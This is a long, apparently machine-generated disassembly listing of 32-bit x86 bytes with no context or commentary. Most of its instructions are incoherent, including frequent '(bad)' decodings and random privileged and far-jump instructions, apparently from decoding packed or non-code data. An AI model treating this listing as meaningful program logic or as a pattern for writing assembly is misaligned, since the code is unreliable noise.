  42f902:	fucomip st,st(4)
  42f904:	fnstsw WORD PTR [esi+0x631b3d13]
  42f90a:	jp     0x42f96d
  42f90c:	jae    0x42f8a1
  42f90e:	or     ah,BYTE PTR [edi+0x43]
  42f911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f912:	gs jnp 0x42f97f
  42f915:	inc    ebp
  42f916:	and    eax,0xf9e9993e
  42f91b:	cli    
  42f91c:	jo     0x42f998
  42f91e:	xlat   BYTE PTR ds:[ebx]
  42f91f:	rcl    BYTE PTR [ebp-0x5c],cl
  42f922:	mov    WORD PTR [eax-0x6a],?
  42f925:	adc    esp,DWORD PTR [edx-0x74a6ceb9]
  42f92b:	lea    eax,[ecx]
  42f92d:	cmp    eax,0x75bc187b
  42f932:	mov    eax,ds:0xcf87898b
  42f937:	xchg   DWORD PTR [ecx+esi*8+0x21],edi
  42f93b:	or     BYTE PTR [esi+0x15],cl
  42f93e:	rol    BYTE PTR [esi+0x42c13f56],1
  42f944:	sub    BYTE PTR [eax],0xd6
  42f947:	mov    ecx,0x7b323524
  42f94c:	ficom  WORD PTR [ebp+0x5fa8057b]
  42f952:	xor    edi,DWORD PTR fs:[edx+ecx*8+0xc24d9b5]
  42f95a:	xchg   BYTE PTR [edi],bh
  42f95c:	nop
  42f95d:	stos   BYTE PTR es:[edi],al
  42f95e:	xchg   DWORD PTR [ecx],edx
  42f960:	add    eax,0x9848b630
  42f965:	bound  sp,DWORD PTR [edx]
  42f968:	xor    dh,BYTE PTR [ebp+0x52b443]
	...
  42f9d6:	adc    al,0x74
  42f9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f9d9:	push   ebp
  42f9da:	in     al,0xd5
  42f9dc:	cmc    
  42f9dd:	jne    0x42f98a
  42f9df:	sbb    cl,dh
  42f9e1:	js     0x42f995
  42f9e3:	mov    edx,ebp
  42f9e5:	bound  eax,QWORD PTR [eax-0x3]
  42f9e8:	add    DWORD PTR [eax],eax
  42f9ea:	inc    DWORD PTR [eax]
  42f9ec:	add    BYTE PTR [eax],al
  42f9ee:	out    0x2c,eax
  42f9f0:	leave  
  42f9f1:	js     0x42f9ae
  42f9f3:	pop    eax
  42f9f4:	jns    0x42f9b9
  42f9f6:	add    ebp,ebp
  42f9f8:	sar    cl,1
  42f9fa:	mov    dl,0xa8
  42f9fc:	mov    edx,0x61522664
  42fa01:	cmp    DWORD PTR [esi],ecx
  42fa03:	jg     0x42f9cc
  42fa05:	in     al,dx
  42fa06:	cmc    
  42fa07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa08:	imul   ecx,edi,0x9b33c292
  42fa0e:	jge    0x42f9dc
  42fa10:	das    
  42fa11:	call   0x36c4128a
  42fa16:	int    0x71
  42fa18:	stos   BYTE PTR es:[edi],al
  42fa19:	int    0x8
  42fa1b:	in     al,0xae
  42fa1d:	jae    0x42fa1d
  42fa1f:	push   ebp
  42fa20:	xchg   ecx,eax
  42fa21:	add    al,BYTE PTR [edx]
  42fa23:	cmp    al,0x4a
  42fa25:	data16 dec BYTE PTR [ebx+0x35]
  42fa29:	mov    bh,bh
  42fa2b:	xchg   edi,eax
  42fa2c:	sub    esp,DWORD PTR [edx]
  42fa2e:	std    
  42fa2f:	mov    ?,WORD PTR [edi]
  42fa31:	(bad)  
  42fa32:	fnstsw WORD PTR [edi]
  42fa34:	sbb    esp,DWORD PTR [ebp-0x382c2e7d]
  42fa3a:	fidivr DWORD PTR [ebx]
  42fa3c:	lea    esi,ds:0x86c8a976
  42fa42:	in     eax,dx
  42fa43:	push   ecx
  42fa44:	adc    BYTE PTR [edi-0x49143030],al
  42fa4a:	jg     0x42fa14
  42fa4c:	push   es
  42fa4d:	mov    ch,0xed
  42fa4f:	push   ss
  42fa50:	jmp    0x42fa70
  42fa52:	(bad)  
  42fa53:	lods   eax,DWORD PTR ds:[esi]
  42fa54:	sub    DWORD PTR [eax-0x53e0fd6d],esp
  42fa5a:	mov    eax,ds:0x9a0e0679
  42fa5f:	mov    ds:0xbeff1656,eax
  42fa64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa66:	xchg   DWORD PTR [ebx+0x56],eax
  42fa69:	pop    ebp
  42fa6a:	sbb    esp,ebx
  42fa6c:	mov    eax,ds:0x31f6a6e2
  42fa71:	aad    0x13
  42fa73:	inc    ecx
  42fa74:	call   0x78578a2
  42fa79:	jns    0x42fad1
  42fa7b:	mov    ds:0x5329136f,al
  42fa80:	inc    ecx
  42fa81:	jae    0x42fa87
  42fa83:	imul   ebp,DWORD PTR [ebp-0x1e],0xffffffd1
  42fa87:	(bad)  
  42fa88:	fidivr WORD PTR [esi-0xe94535f]
  42fa8e:	test   DWORD PTR [ecx+ebp*2],eax
  42fa91:	das    
  42fa92:	test   DWORD PTR [esi+0x799dbba1],esi
  42fa98:	(bad)  
  42fa99:	ja     0x42fa30
  42fa9b:	rol    BYTE PTR [eax],0x1d
  42fa9e:	cmp    eax,0xc1ab2385
  42faa3:	aam    0xf1
  42faa5:	xor    DWORD PTR [ebx],ecx
  42faa7:	pop    ds
  42faa8:	imul   ebp,esp,0xa15e9912
  42faae:	neg    DWORD PTR [ebp+0x5dff6a89]
  42fab4:	sbb    bh,BYTE PTR [ecx+0x76]
  42fab7:	xchg   edx,eax
  42fab8:	cld    
  42fab9:	ret    0x2232
  42fabc:	scas   al,BYTE PTR es:[edi]
  42fabd:	retf   
  42fabe:	jmp    0x42fa94
  42fac0:	dec    esp
  42fac1:	xor    bh,ch
  42fac3:	xchg   ebp,eax
  42fac4:	loop   0x42fac6
  42fac6:	cmc    
  42fac7:	(bad)  
  42fac8:	cdq    
  42fac9:	mov    al,BYTE PTR [eax]
  42facb:	bound  ebx,QWORD PTR [edi+0x167c6023]
  42fad1:	push   ebx
  42fad2:	pop    esp
  42fad3:	sub    BYTE PTR [eax-0xd],0x19
  42fad7:	sub    al,0x5b
  42fad9:	shr    DWORD PTR [esi+0x24],1
  42fadc:	dec    ebx
  42fadd:	sbb    eax,DWORD PTR [eax+0x125657d1]
  42fae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fae4:	sti    
  42fae5:	sbb    al,0xeb
  42fae7:	pop    edx
  42fae8:	popa   
  42fae9:	mov    ecx,0xdd2d09
	...
  42fb56:	sbb    ebp,edi
  42fb58:	shl    BYTE PTR [esi],0xf4
  42fb5b:	aas    
  42fb5c:	(bad)  
  42fb5d:	out    dx,eax
  42fb5e:	int3   
  42fb5f:	mov    WORD PTR [edi+0x32],?
  42fb62:	mov    cl,0x8c
  42fb64:	data16 fnstcw WORD PTR [edi]
  42fb67:	inc    BYTE PTR [ecx]
  42fb69:	add    bh,bh
  42fb6b:	add    BYTE PTR [eax],al
  42fb6d:	add    BYTE PTR [eax+esi*8],al
  42fb70:	fucomip st,st(0)
  42fb72:	imul   esi,edx,0x78774d79
  42fb78:	imul   esp,ebp,0x4010ac01
  42fb7e:	add    ch,BYTE PTR [ebp+0x3ce9a9c9]
  42fb84:	mov    ah,0x67
  42fb86:	sbb    al,0xa0
  42fb88:	test   BYTE PTR [edx+0x334c6037],cl
  42fb8e:	adc    eax,0xf5333444
  42fb93:	lahf   
  42fb94:	loopne 0x42fb8a
  42fb96:	adc    DWORD PTR [ebp-0x342f8cb2],ebx
  42fb9c:	jl     0x42fbd7
  42fb9e:	inc    edx
  42fb9f:	or     BYTE PTR ds:0xa76dfa8f,dh
  42fba5:	popf   
  42fba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fba7:	mov    ebp,0xbcae5c72
  42fbac:	sbb    al,0x57
  42fbae:	add    al,BYTE PTR [esi]
  42fbb0:	loopne 0x42fc29
  42fbb2:	push   ss
  42fbb3:	adc    DWORD PTR [esp+eax*1-0x14],0xe9a94343
  42fbbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fbbc:	and    al,0xea
  42fbbe:	psadbw mm2,mm2
  42fbc1:	lock mov cl,0x32
  42fbc4:	push   ecx
  42fbc5:	fwait
  42fbc6:	inc    ebp
  42fbc7:	mov    cl,0x21
  42fbc9:	inc    esi
  42fbca:	pop    ecx
  42fbcb:	mov    al,ds:0xa7d5cb07
  42fbd0:	arpl   WORD PTR [ecx-0x20],ax
  42fbd3:	or     edx,esi
  42fbd5:	imul   BYTE PTR [ecx+0x6dd9b3a4]
  42fbdb:	xchg   edx,eax
  42fbdc:	mov    edx,0xcddcbde8
  42fbe1:	test   BYTE PTR [edi],al
  42fbe3:	jnp    0x42fc42
  42fbe5:	daa    
  42fbe6:	cdq    
  42fbe7:	ins    DWORD PTR es:[edi],dx
  42fbe8:	addr16 int3 
  42fbea:	inc    edi
  42fbeb:	out    0xa,eax
  42fbed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fbee:	mov    edi,0xc704e5e6
  42fbf3:	imul   esi,edx,0xffffffce
  42fbf6:	dec    edx
  42fbf7:	push   ds
  42fbf8:	ret    
  42fbf9:	or     ebx,DWORD PTR [eax+edx*2]
  42fbfc:	scas   eax,DWORD PTR es:[edi]
  42fbfd:	sti    
  42fbfe:	test   BYTE PTR [ecx],cl
  42fc00:	jl     0x42fc45
  42fc02:	lahf   
  42fc03:	mov    ds:0xfb413910,eax
  42fc08:	jge    0x42fbdc
  42fc0a:	inc    edx
  42fc0b:	push   0x42
  42fc0d:	(bad)  
  42fc0e:	sbb    DWORD PTR [ecx],ebp
  42fc10:	aad    0xe3
  42fc12:	in     eax,0x74
  42fc14:	xchg   edx,eax
  42fc15:	mov    bl,bl
  42fc17:	ja     0x939efdd1
  42fc1d:	sub    al,0x76
  42fc1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fc20:	int3   
  42fc21:	sti    
  42fc22:	cdq    
  42fc23:	mov    ebp,0xbcd42ca5
  42fc28:	add    ebx,ebx
  42fc2a:	adc    al,0x98
  42fc2c:	cmp    BYTE PTR [esi],ah
  42fc2e:	xor    al,0xbf
  42fc30:	inc    ebx
  42fc31:	mov    edx,0x841f0814
  42fc36:	or     cl,dl
  42fc38:	add    ah,dh
  42fc3a:	and    DWORD PTR [esi-0x40],edx
  42fc3d:	mov    bl,0x71
  42fc3f:	push   esp
  42fc40:	xor    DWORD PTR [esi+0x7dc27e7a],eax
  42fc46:	cli    
  42fc47:	fst    DWORD PTR [ebx+0x6e092d0d]
  42fc4d:	xchg   esi,eax
  42fc4e:	or     eax,eax
  42fc50:	stc    
  42fc51:	jg     0x42fc51
  42fc53:	ins    DWORD PTR es:[edi],dx
  42fc54:	inc    esp
  42fc55:	daa    
  42fc56:	xor    BYTE PTR [ecx+0x71],ah
  42fc59:	mov    ?,edi
  42fc5b:	retf   0x6bcc
  42fc5e:	xor    eax,0x2012d847
  42fc63:	(bad)
  42fc66:	lock lahf 
  42fc68:	push   0xffffffc8
  42fc6a:	cmc    
  42fc6b:	sub    eax,0x24
	...
  42fcd4:	add    BYTE PTR [eax],al
  42fcd6:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fcdc:	mov    ebx,0x36325e9a
  42fce1:	and    BYTE PTR [edi-0x27],cl
  42fce4:	ss dec esp
  42fce6:	inc    DWORD PTR ds:[ecx]
  42fce9:	add    bh,bh
  42fceb:	add    BYTE PTR [eax],al
  42fced:	add    BYTE PTR [ecx+0x39470d4f],cl
  42fcf3:	add    BYTE PTR [esi],dl
  42fcf5:	sar    BYTE PTR [ecx],0x63
  42fcf8:	std    
  42fcf9:	les    ecx,FWORD PTR [edi-0xfaeb15e]
  42fcff:	enter  0xa8e0,0x74
  42fd03:	lds    esp,FWORD PTR [ebx]
  42fd05:	pop    esp
  42fd06:	push   eax
  42fd07:	xor    eax,0x6768421f
  42fd0c:	adc    edx,DWORD PTR [ecx]
  42fd0e:	popa   
  42fd0f:	out    dx,eax
  42fd10:	jmp    0x8b76:0x847a993e
  42fd17:	add    BYTE PTR [esi+eax*2],0x69
  42fd1b:	ds mov edx,0xcb60bde2
  42fd21:	sbb    BYTE PTR [edi],0xae
  42fd24:	adc    eax,0xc38df483
  42fd29:	and    BYTE PTR [esi],dl
  42fd2b:	push   0x8ab9b978
  42fd30:	sbb    bh,BYTE PTR [ebp-0x18cb6071]
  42fd36:	iret   
  42fd37:	rol    ecx,0xf7
  42fd3a:	mov    al,0xf8
  42fd3c:	sahf   
  42fd3d:	scas   eax,DWORD PTR es:[edi]
  42fd3e:	jecxz  0x42fcfa
  42fd40:	bswap  edx
  42fd42:	push   edx
  42fd43:	jecxz  0x42fd09
  42fd45:	ins    BYTE PTR es:[edi],dx
  42fd46:	out    dx,eax
  42fd47:	add    ch,BYTE PTR [ecx]
  42fd49:	dec    eax
  42fd4a:	push   ebx
  42fd4b:	mov    ah,0x83
  42fd4d:	add    eax,0x196c4ea3
  42fd52:	xchg   DWORD PTR [edx-0x2],esp
  42fd55:	mov    ch,0xe3
  42fd57:	push   0xa73f6d0
  42fd5c:	xor    ebp,DWORD PTR [ebp-0x3cd74b1f]
  42fd62:	pop    eax
  42fd63:	xchg   ebp,eax
  42fd64:	test   BYTE PTR [edx+0xc],bh
  42fd67:	loope  0x42fdc1
  42fd69:	aas    
  42fd6a:	fild   WORD PTR [ebx+0x64]
  42fd6d:	hlt    
  42fd6e:	(bad)  
  42fd70:	out    0x5b,al
  42fd72:	addr16 aaa 
  42fd74:	adc    dh,BYTE PTR [eax+0x7ec2a784]
  42fd7a:	xor    bh,ch
  42fd7c:	jae    0x42fd23
  42fd7e:	inc    ebx
  42fd7f:	addr16 daa 
  42fd81:	inc    ebx
  42fd82:	jb     0x42fd5a
  42fd84:	js     0x42fd11
  42fd86:	test   esp,ebx
  42fd88:	push   ss
  42fd89:	cld    
  42fd8a:	rcl    BYTE PTR [edi-0x40fc6e2e],cl
  42fd90:	fisub  DWORD PTR [edi+0xb70af2c]
  42fd96:	dec    esp
  42fd98:	mov    esp,edi
  42fd9a:	mov    ch,0xc7
  42fd9c:	mov    cl,0x1f
  42fd9e:	(bad)  
  42fda0:	pop    es
  42fda1:	mov    BYTE PTR [edi+0x12f53d6f],0x6a
  42fda8:	mov    ?,WORD PTR [ebx]
  42fdaa:	mov    edi,0x3c793807
  42fdaf:	es popa 
  42fdb1:	inc    esp
  42fdb2:	push   ebx
  42fdb3:	mov    eax,0x1957c60f
  42fdb8:	repnz sub eax,0x8a3d9123
  42fdbe:	push   esi
  42fdbf:	mov    cl,0x97
  42fdc1:	and    dh,BYTE PTR [edi]
  42fdc3:	push   ebp
  42fdc4:	sub    ecx,DWORD PTR [edi-0x568d7c66]
  42fdca:	rol    WORD PTR ds:0xff5dd867,cl
  42fdd1:	cdq    
  42fdd2:	outs   dx,BYTE PTR ds:[esi]
  42fdd3:	mov    eax,0x14f784df
  42fdd8:	push   esi
  42fdd9:	push   eax
  42fdda:	sbb    BYTE PTR [ebx-0x6e04e6fd],dl
  42fde0:	mov    eax,0x8d400b75
  42fde5:	outs   dx,BYTE PTR ds:[esi]
  42fde6:	pop    ecx
  42fde7:	mov    BYTE PTR [eax+0x56b8b1b5],ah
	...
  42fe55:	add    BYTE PTR [eax-0x40],cl
  42fe58:	ret    0xcaf0
  42fe5b:	bnd jp 0x42fe56
  42fe5e:	cmc    
  42fe5f:	inc    edx
  42fe60:	stos   BYTE PTR es:[edi],al
  42fe61:	repz adc al,al
  42fe64:	fwait
  42fe65:	icebp  
  42fe66:	cmp    eax,0xff000200
  42fe6b:	add    BYTE PTR [eax],al
  42fe6d:	add    BYTE PTR [edx],cl
  42fe6f:	and    BYTE PTR [ebp-0x1d],dh
  42fe72:	sbb    BYTE PTR [ebx+esi*8],ah
  42fe75:	push   0x3b1b69a0
  42fe7a:	lea    esi,[edi+0x78]
  42fe7d:	loopne 0x42fe98
  42fe7f:	rol    BYTE PTR [eax-0x4f],1
  42fe82:	add    cl,BYTE PTR [edx]
  42fe84:	fcomp  QWORD PTR [ebp+0x43]
  42fe87:	aas    
  42fe88:	jno    0x42fe3b
  42fe8a:	or     DWORD PTR [ebx+0x36],edx
  42fe8d:	mov    cl,dh
  42fe8f:	jge    0x42fe67
  42fe91:	int3   
  42fe92:	int    0x8a
  42fe94:	fcomp  DWORD PTR [edi-0x27]
  42fe97:	pusha  
  42fe98:	std    
  42fe99:	lds    edx,FWORD PTR [esi]
  42fe9b:	das    
  42fe9c:	add    BYTE PTR [ebp+0x33],ch
  42fe9f:	bound  ebx,QWORD PTR [edi]
  42fea1:	lock lods al,BYTE PTR ds:[esi]
  42fea3:	inc    ecx
  42fea4:	mov    ds:0x748c0ffb,eax
  42fea9:	xchg   ecx,eax
  42feaa:	xor    bl,ah
  42feac:	mov    bl,0x3b
  42feae:	and    DWORD PTR [ebx],edi
  42feb0:	xchg   ecx,eax
  42feb1:	in     al,dx
  42feb2:	push   es
  42feb3:	clc    
  42feb4:	leave  
  42feb5:	ds ja  0x42ff22
  42feb8:	adc    BYTE PTR [eax-0x29],0x87
  42febc:	sahf   
  42febd:	xchg   edi,eax
  42febe:	inc    ecx
  42febf:	xor    al,0x20
  42fec1:	xor    DWORD PTR ds:0xdb770761,edi
  42fec7:	push   eax
  42fec8:	fucom  st(1)
  42feca:	pop    ebx
  42fecb:	adc    ah,0x5f
  42fece:	test   DWORD PTR [ebx-0x4a],esp
  42fed1:	enter  0xfd66,0x67
  42fed5:	inc    edi
  42fed6:	(bad)  
  42fed7:	or     eax,0x5f3af44f
  42fedc:	popa   
  42fedd:	int    0x10
  42fedf:	jne    0x42fe7d
  42fee1:	fsubp  st(7),st
  42fee3:	xchg   ecx,eax
  42fee4:	ret    
  42fee5:	cmp    DWORD PTR [ebx],ecx
  42fee7:	(bad)  
  42fee8:	mov    esp,0x86af3f79
  42feed:	inc    ebx
  42feee:	and    ebp,DWORD PTR [edi]
  42fef0:	sub    ebp,edx
  42fef2:	hlt    
  42fef3:	shr    DWORD PTR [edx+0x55bd3f09],1
  42fef9:	xchg   ecx,eax
  42fefa:	ret    0x8894
  42fefd:	rol    DWORD PTR [edi-0x4dee9c33],cl
  42ff03:	mov    eax,ds:0xf3b11ee1
  42ff08:	xchg   ebp,eax
  42ff09:	(bad)  
  42ff0a:	iret   
  42ff0b:	fs jmp 0xdce7:0x26a71892
  42ff13:	or     ecx,DWORD PTR [edx-0x4c]
  42ff16:	nop
  42ff17:	add    dl,0x8e
  42ff1a:	jne    0x42ff3c
  42ff1c:	hlt    
  42ff1d:	repnz pop edi
  42ff1f:	test   eax,0x7301c6f3
  42ff24:	mov    WORD PTR [edx-0x7aea6ea6],?
  42ff2a:	mov    eax,0x26199b06
  42ff2f:	bnd jns 0x42feec
  42ff32:	(bad)  
  42ff33:	repnz fwait
  42ff35:	push   ss
  42ff36:	inc    edx
  42ff37:	mov    eax,0x6a8e56b0
  42ff3c:	and    al,0x2e
  42ff3e:	sub    edi,ebp
  42ff40:	dec    eax
  42ff41:	sub    WORD PTR [edx-0x3984c2fd],sp
  42ff48:	mov    ah,0x6a
  42ff4a:	pop    ebx
  42ff4b:	push   esp
  42ff4c:	xchg   ecx,eax
  42ff4d:	adc    ecx,ecx
  42ff4f:	fld    st(4)
  42ff51:	cmp    al,0xcc
  42ff53:	call   0x23e37958
  42ff58:	in     eax,0x39
  42ff5a:	fsubr  QWORD PTR [ebp-0x76d457e4]
  42ff60:	dec    edi
  42ff61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ff62:	cmp    DWORD PTR [edx+ebp*4+0x6],esp
  42ff66:	mov    ch,0xd9
  42ff68:	mov    esi,0xfefa0dbc
	...
  42ffd5:	add    BYTE PTR [edi+eiz*2],al
  42ffd8:	std    
  42ffd9:	aaa    
  42ffda:	(bad)  
  42ffdb:	mov    edi,0x9ffa77ce
  42ffe0:	shl    DWORD PTR [eax+ebx*4+0x2b],0x2b
  42ffe5:	and    bh,BYTE PTR [ecx+eax*1]
  42ffe8:	add    al,BYTE PTR [eax]
  42ffea:	inc    DWORD PTR [eax]
  42ffec:	add    BYTE PTR [eax],al
  42ffee:	mov    bh,0x67
  42fff0:	leave  
  42fff1:	add    eax,DWORD PTR [edi]
  42fff3:	push   ds
  42fff4:	int    0x3e
  42fff6:	scas   eax,DWORD PTR es:[edi]
  42fff7:	xchg   BYTE PTR ds:0x1a578dac,cl
  42fffd:	sbb    eax,0xc07c9039
  430002:	iret   
  430003:	jnp    0x430033
  430005:	pop    edx
  430006:	push   edx
  430007:	loopne 0x430023
  430009:	shl    DWORD PTR [esp+ebx*2],0x39
  43000d:	xchg   DWORD PTR [ecx+0x6728c25f],ebp
  430013:	retf   
  430014:	jl     0x42ffdf
  430016:	sahf   
  430017:	inc    ebp
  430018:	in     eax,0x92
  43001a:	lods   eax,DWORD PTR ds:[esi]
  43001b:	ins    BYTE PTR es:[edi],dx
  43001c:	jnp    0x430085
  43001e:	push   ebp
  43001f:	test   BYTE PTR [eax-0x5a],cl
  430022:	or     eax,0x50e1aedd
  430027:	lods   al,BYTE PTR ds:[esi]
  430028:	aaa    
  430029:	add    cl,bl
  43002b:	scas   al,BYTE PTR es:[edi]
  43002c:	ds add eax,0x4892bff2
  430032:	pop    ecx
  430033:	ins    DWORD PTR es:[edi],dx
  430034:	test   al,0xd0
  430036:	mov    ?,esp
  430038:	jnp    0x430017
  43003a:	mov    ds:0x7908c4d2,eax
  43003f:	out    dx,al
  430040:	aam    0x26
  430042:	xrelease mov DWORD PTR [esi],eax
  430045:	push   ds
  430046:	in     eax,dx
  430047:	cs loop 0x43000e
  43004a:	shl    BYTE PTR [ecx+0x31],0x8a
  43004e:	dec    ebp
  43004f:	hlt    
  430050:	and    bh,0x13
  430053:	sub    DWORD PTR [ecx-0x14],edx
  430056:	ja     0x430070
  430058:	test   BYTE PTR [ebx+0x7b50cc60],bl
  43005e:	pop    ebp
  43005f:	stc    
  430060:	xchg   DWORD PTR [ecx],ebp
  430062:	pop    eax
  430063:	mov    eax,0x140cff6a
  430068:	add    dl,BYTE PTR [ebp+0x451fa915]
  43006e:	jno    0x430070
  430070:	pop    ds
  430071:	jmp    FWORD PTR [edi-0x19]
  430074:	add    DWORD PTR [edi+0x13bd1989],edi
  43007a:	(bad)  
  43007b:	out    0xe3,al
  43007d:	lods   al,BYTE PTR ds:[esi]
  43007e:	push   eax
  43007f:	add    edi,DWORD PTR [esi]
  430081:	stos   BYTE PTR es:[edi],al
  430082:	mov    al,0xd2
  430084:	lods   eax,DWORD PTR ds:[esi]
  430085:	sub    BYTE PTR [edx],al
  430087:	pop    ebp
  430088:	repz retf 0xd117
  43008c:	adc    al,0xd4
  43008e:	cli    
  43008f:	or     al,0xd4
  430091:	out    0xb6,al
  430093:	jecxz  0x43010a
  430095:	daa    
  430096:	arpl   WORD PTR [edx-0x597ea813],ax
  43009c:	xor    al,0xa9
  43009e:	and    al,dl
  4300a0:	dec    edi
  4300a1:	pop    edx
  4300a2:	ja     0x430037
  4300a4:	xchg   edi,eax
  4300a5:	lods   eax,DWORD PTR ds:[esi]
  4300a6:	loop   0x43007f
  4300a8:	repnz sub eax,0x9c9f09ac
  4300ae:	fcmovnu st,st(2)
  4300b0:	les    ebx,FWORD PTR [edx-0x70]
  4300b3:	adc    eax,0xc8b29033
  4300b8:	push   esi
  4300b9:	loop   0x430051
  4300bb:	imul   esi,ecx,0xdef6af47
  4300c1:	cs fs arpl si,si
  4300c5:	(bad)  [ebp+ebp*8+0x72]
  4300c9:	into   
  4300ca:	mov    WORD PTR [eax],es
  4300cc:	in     eax,0x2c
  4300ce:	ins    BYTE PTR es:[edi],dx
  4300cf:	add    dh,BYTE PTR [esi-0x74]
  4300d2:	(bad)  
  4300d4:	mov    ah,0x4e
  4300d6:	fs dec ebp
  4300d8:	in     al,dx
  4300d9:	stos   DWORD PTR es:[edi],eax
  4300da:	sub    al,0xfe
  4300dc:	mov    bl,0xda
  4300de:	enter  0xe569,0x9e
  4300e2:	push   eax
  4300e3:	sbb    eax,0x4b2e7f1
  4300e8:	fldenv [edi-0x20]
  4300eb:	stc    
  4300ec:	pop    edi
	...
  430155:	add    bh,al
  430157:	ins    DWORD PTR es:[edi],dx
  430158:	aam    0xb5
  43015a:	(bad)  
  43015b:	mov    ebp,0x9547fe7
  430160:	scas   eax,DWORD PTR es:[edi]
  430161:	add    al,0x98
  430163:	inc    eax
  430164:	mov    ss,edi
  430166:	cmp    eax,DWORD PTR [edx]
  430168:	add    al,BYTE PTR [eax]
  43016a:	sub    al,BYTE PTR [eax]
  43016c:	add    BYTE PTR [eax],al
  43016e:	out    0x9b,eax
  430170:	xchg   ebx,eax
  430171:	rol    BYTE PTR [esi+0x61],cl
  430174:	in     al,dx
  430175:	aad    0xfb
  430177:	add    dh,0x70
  43017a:	aaa    
  43017b:	fldenv [edx]
  43017d:	jo     0x430112
  43017f:	mov    esp,0x47cc3a97
  430184:	test   BYTE PTR [edx+0x77024c9b],0x28
  43018b:	add    DWORD PTR [ecx],ebx
  43018d:	retf   0x6481
  430190:	(bad)  
  430191:	xlat   BYTE PTR ds:[ebx]
  430192:	xchg   edx,eax
  430193:	mov    ecx,0x65c12b3e
	...
  4301d4:	add    BYTE PTR [eax],al
  4301d6:	dec    ebp
  4301d7:	push   ebp
  4301d8:	mov    DWORD PTR [ebx-0x7e9e13f8],ecx
  4301de:	mov    esp,ebp
  4301e0:	or     al,ah
  4301e2:	dec    ebp
  4301e3:	add    bh,al
  4301e5:	add    BYTE PTR [eax],cl
  4301e7:	add    BYTE PTR [eax],al
  4301e9:	mov    DWORD PTR [eax],0x3ff44545
  4301ef:	xor    DWORD PTR [eax],eax
  4301f1:	test   DWORD PTR [ebx-0x34070b64],ecx
  4301f7:	(bad)  
  4301f8:	enter  0x4d45,0xb8
  4301fc:	mov    esi,DWORD PTR [edx]
  4301fe:	hlt    
  4301ff:	test   ebx,ecx
  430201:	pushf  
  430202:	enter  0x4df8,0x8b
  430206:	mov    DWORD PTR [ebp+0x8],0x894708
  43020d:	inc    ebp
  43020e:	mov    ebp,0xff8bfffc
  430213:	dec    ebp
  430214:	mov    ch,0xf4
  430216:	call   DWORD PTR [ebx-0x1]
  430219:	mov    ebx,0x8005426
  43021e:	call   DWORD PTR [ecx+0x8]
  430221:	pop    es
  430222:	jmp    0xb8:0x9cb4533
  430229:	fwait
  43022a:	mov    esi,DWORD PTR [edx-0xc]
  43022d:	xor    al,bl
  43022f:	add    BYTE PTR [ebx+0x3c83203],bl
  430235:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  43023b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430241:	xor    eax,DWORD PTR [eax]
  430243:	retf   
  430244:	ret    
  430245:	add    eax,esi
  430247:	enter  0x8945,0x64
  43024b:	dec    ebp
  43024c:	sbb    ah,cl
  43024e:	add    BYTE PTR [ebx-0xb87b277],cl
  430254:	dec    DWORD PTR [ebx-0xbcfb275]
  43025a:	test   DWORD PTR [ebx],esi
  43025c:	dec    ebx
  43025e:	inc    DWORD PTR [ebx]
  430260:	inc    eax
  430261:	enter  0x8989,0x64
  430265:	(bad)  
  430266:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  43026a:	cld    
  43026b:	dec    DWORD PTR [ebp-0xa90001]
  430271:	push   edi
  430272:	mov    BYTE PTR [edx+0x1],ch
  430275:	and    DWORD PTR [eax],eax
  430277:	pop    ecx
  430278:	inc    ebp
  430279:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43027f:	push   0xffffff89
  430281:	pop    ecx
  430282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430283:	dec    ebp
  430284:	add    BYTE PTR [ecx+0x45fc088b],cl
  43028a:	jne    0x4302d5
  43028c:	lea    eax,[eax]
  43028e:	fs (bad) 
  430290:	dec    DWORD PTR [eax]
  430292:	mov    DWORD PTR [eax],eax
  430294:	test   al,0x0
  430296:	add    BYTE PTR [ebp-0x18],cl
  430299:	xor    ebp,DWORD PTR [edx]
  43029b:	add    eax,DWORD PTR [eax]
  43029d:	mov    eax,eax
  43029f:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4302a6:	inc    ebp
  4302a7:	mov    DWORD PTR [ebx+0x459408],ecx
  4302ad:	bound  ecx,QWORD PTR [ebx-0x372749b]
  4302b3:	inc    eax
  4302b4:	cmp    bh,0x1
  4302b7:	lea    eax,[eax]
  4302b9:	and    BYTE PTR [eax],al
  4302bb:	inc    DWORD PTR [ecx-0x18]
  4302be:	mov    ecx,DWORD PTR [ebx]
  4302c0:	cld    
  4302c1:	add    BYTE PTR [ecx+0x75014d],cl
  4302c7:	(bad)  
  4302c8:	xchg   ebp,eax
  4302c9:	sar    bh,1
  4302cb:	inc    eax
  4302cc:	inc    DWORD PTR [eax]
  4302ce:	mov    eax,DWORD PTR [ebp-0x4]
  4302d1:	xor    edx,DWORD PTR [edx+0x7201be]
  4302d7:	add    BYTE PTR [edx],dl
  4302d9:	(bad)  
  4302da:	nop
  4302db:	inc    ebp
  4302dc:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4302e2:	mov    al,0xff
  4302e4:	add    bh,bh
  4302e6:	add    BYTE PTR [ebx],dh
  4302e8:	inc    DWORD PTR [ebx]
  4302ea:	sbb    al,0x89
  4302ec:	jne    0x4302ca
  4302ee:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4302f4:	mov    eax,DWORD PTR [ebp-0xff0048]
  4302fa:	mov    DWORD PTR [eax-0x70],0xec70ed89
  430301:	inc    DWORD PTR [ebp-0x75]
  430304:	fisttp QWORD PTR [esi+ebp*8]
  430307:	test   DWORD PTR [esi-0x1],esp
  43030a:	inc    ebp
  43030b:	(bad)  
